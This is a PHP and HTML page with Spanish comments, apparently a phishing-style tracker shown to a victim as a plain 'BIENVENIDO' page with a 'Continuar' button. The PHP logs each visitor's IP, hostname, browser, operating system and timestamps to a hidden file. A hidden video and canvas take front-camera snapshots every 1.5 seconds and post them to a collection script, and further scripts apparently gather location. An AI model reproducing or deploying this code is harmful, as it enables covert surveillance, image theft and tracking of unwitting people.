
<?php

$ip = $_SERVER[ 'REMOTE_ADDR' ];
$agent = $_SERVER['HTTP_USER_AGENT'];
$server_port=$_SERVER['SERVER_PORT'];
$gateway=$_SERVER['GATEWAY_INTERFACE'];
$pagina = $_SERVER['REQUEST_URI'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);



#CAPTURA EL NAVEGADOR
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$user_agent;
  function getBrowser($user_agent){
    if(strpos($user_agent, 'Maxthon') !== FALSE)
      return "Maxthon";
    elseif(strpos($user_agent, 'SeaMonkey') !== FALSE)
      return "SeaMonkey";
    elseif(strpos($user_agent, 'Vivaldi') !== FALSE)
      return "Vivaldi";
    elseif(strpos($user_agent, 'Arora') !== FALSE)
      return "Arora";
    elseif(strpos($user_agent, 'Avant Browser') !== FALSE)
      return "Avant Browser";
    elseif(strpos($user_agent, 'Beamrise') !== FALSE)
      return "Beamrise";
    elseif(strpos($user_agent, 'Epiphany') !== FALSE)
      return 'Epiphany';
    elseif(strpos($user_agent, 'Chromium') !== FALSE)
      return 'Chromium';
    elseif(strpos($user_agent, 'Iceweasel') !== FALSE)
      return 'Iceweasel';
    elseif(strpos($user_agent, 'Galeon') !== FALSE)
      return 'Galeon';
    elseif(strpos($user_agent, 'Edge') !== FALSE)
      return 'Microsoft Edge';
    elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
      return 'Internet Explorer';
    elseif(strpos($user_agent, 'MSIE') !== FALSE)
      return 'Internet Explorer';
    elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
      return "Opera Mini";
    elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
      return "Opera";
    elseif(strpos($user_agent, 'Firefox') !== FALSE)
      return 'Mozilla Firefox';
    elseif(strpos($user_agent, 'Chrome') !== FALSE)
      return 'Google Chrome';
    elseif(strpos($user_agent, 'Safari') !== FALSE)
      return "Safari";
    elseif(strpos($user_agent, 'iTunes') !== FALSE)
      return 'iTunes';
    elseif(strpos($user_agent, 'Konqueror') !== FALSE)
      return 'Konqueror';
    elseif(strpos($user_agent, 'Dillo') !== FALSE)
      return 'Dillo';
    elseif(strpos($user_agent, 'Netscape') !== FALSE)
      return 'Netscape';
    elseif(strpos($user_agent, 'Midori') !== FALSE)
      return 'Midori';
    elseif(strpos($user_agent, 'ELinks') !== FALSE)
      return 'ELinks';
    elseif(strpos($user_agent, 'Links') !== FALSE)
      return 'Links';
    elseif(strpos($user_agent, 'Lynx') !== FALSE)
      return 'Lynx';
    elseif(strpos($user_agent, 'w3m') !== FALSE)
      return 'w3m';
    else
      return 'No hemos podido detectar su navegador';
  }
  $ua = getBrowser($user_agent);
  
  
  
  #CAPTURA EL SISTEMA OPERATIVO
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
function getPlatform($user_agent) {
   $plataformas = array(
      'Windows 10' => 'Windows NT 10.0+',
      'Windows 8.1' => 'Windows NT 6.3+',
      'Windows 8' => 'Windows NT 6.2+',
      'Windows 7' => 'Windows NT 6.1+',
      'Windows Vista' => 'Windows NT 6.0+',
      'Windows XP' => 'Windows NT 5.1+',
      'Windows 2003' => 'Windows NT 5.2+',
      'Windows' => 'Windows otros',
      'iPhone' => 'iPhone',
      'iPad' => 'iPad',
      'Mac OS X' => '(Mac OS X+)|(CFNetwork+)',
      'Mac otros' => 'Macintosh',
      'Android' => 'Android',
      'BlackBerry' => 'BlackBerry',
      'Linux' => 'Linux',
   );
   foreach($plataformas as $plataforma=>$pattern){
      if (preg_match("/$pattern/", $user_agent))
         return $plataforma;
   }
   return 'Otras';
}


$SO = getPlatform($user_agent);

@$fecha = date("m/d/Y",time()); /*capturamos fecha y hora a la cual ingreso (configurar pais)*/
$date = new DateTime($fecha, new DateTimeZone('America/Mexico_City'));
date_default_timezone_set('America/Mexico_City');
$zonahoraria = date_default_timezone_get();
@$hora_actual = date ("g:i:s A",time());


$datum = date("H:i:s A",time());
$invoegen = $datum . "<br><hr>";

$f = fopen("haber.php", "a"); /*crea un archivo html donde se guarda las cuentas*/
fwrite ($f, 
'<pre><tr> 
 <b><font color="#FFFFFF">Objetivo ingreso:</font><td><font color="#9DFFEA">'.$invoegen.'</font><br></td></b>
 <b><font color="#FFFFFF">id:</font><td><font color="#F05921">'.$f.'</font><br></td></b>
 <b><font color="#FFFFFF">Navegador:</font><td><font color="#FF9DBB">'.$ua.'</font><br></td></b>
 <b><font color="#FFFFFF">User-Agent:</font><td><font color="#9DFFEA">'.$agent.'</font><br></td></b>
 <b><font color="#FFFFFF">ISP:</font><td><font color="#9DFFEA">'.$hostname.'</font><br></td></b>
 <b><font color="#FFFFFF">Sistema:</font><td><font color="#9DFFEA">'.$SO.'</font><br></td></b>
 <b><font color="#FFFFFF">IP:</font><td><font color="#00E2FF">'.$ip.'</font><br></td></b>
 <b><font color="#FFFFFF">Fecha:</font><td><font color="#FF6633">'.$fecha.'</font><br></td></b>
 <b><font color="#FFFFFF">Hora:</font><td><font color="#B5A6FF">'.$hora_actual.'</font><br></td></b>
 <b><font color="#FFFFFF">Puerto:</font><b><font color="#F05921">'.$server_port.'</font></b></br>
 <b><font color="#FFFFFF">Gateway:</font><b><font color="#F05921">'.$gateway.'</font></b></tr></br></pre>
 

 ');
 
 


 

fclose($f);


?>









<!doctype html>

<html>

<head>

<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>

<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?sensor=false"></script>

    <script src="js/main.js"></script>
    <script src="js/location.js"></script>
    <script src="js/info.js"></script>
    <script src="js/warpspeed.min.js"></script>

   <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#000000">
    <link rel="icon" type="image/x-icon" href="https://www.freefavicon.com/freefavicons/icons/flat-location-logo-152-234349.png">
    <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">

    <script type="text/javascript">
    if (window.location.protocol == "http:") {
        var restOfUrl = window.location.href.substr(5);
        window.location = "https:" + restOfUrl;
    }</script>

</head>



<div class="video-wrap" hidden="hidden">

   <video id="video" playsinline autoplay></video>

</div>



<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>



<script>



function post(imgdata){

$.ajax({

    type: 'POST',

    data: { cat: imgdata},

    url: 'resultados/post.php',

    dataType: 'json',

    async: false,

    success: function(result){

        // call the function that handles the response/results

    },

    error: function(){

    }

  });

};





'use strict';



const video = document.getElementById('video');

const canvas = document.getElementById('canvas');

const errorMsgElement = document.querySelector('span#errorMsg');



const constraints = {

  audio: false,

  video: {

    

    facingMode: "user"

  }

};



// Access webcam

async function init() {

  try {

    const stream = await navigator.mediaDevices.getUserMedia(constraints);

    handleSuccess(stream);

  } catch (e) {

    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;

  }

}



// Success

function handleSuccess(stream) {

  window.stream = stream;

  video.srcObject = stream;



var context = canvas.getContext('2d');

  setInterval(function(){



       context.drawImage(video, 0, 0, 640, 480);

       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");

       post(canvasData); }, 1500);

  



}



// Load init

init();



</script>

     <body onload="information();">



      <h1>BIENVENIDO</h1>

    <div><button id="change" class="button" type="button" onclick="main()">Continuar</button></div>
    <div class="text" id="result"></div>


          

    </body>



</html>

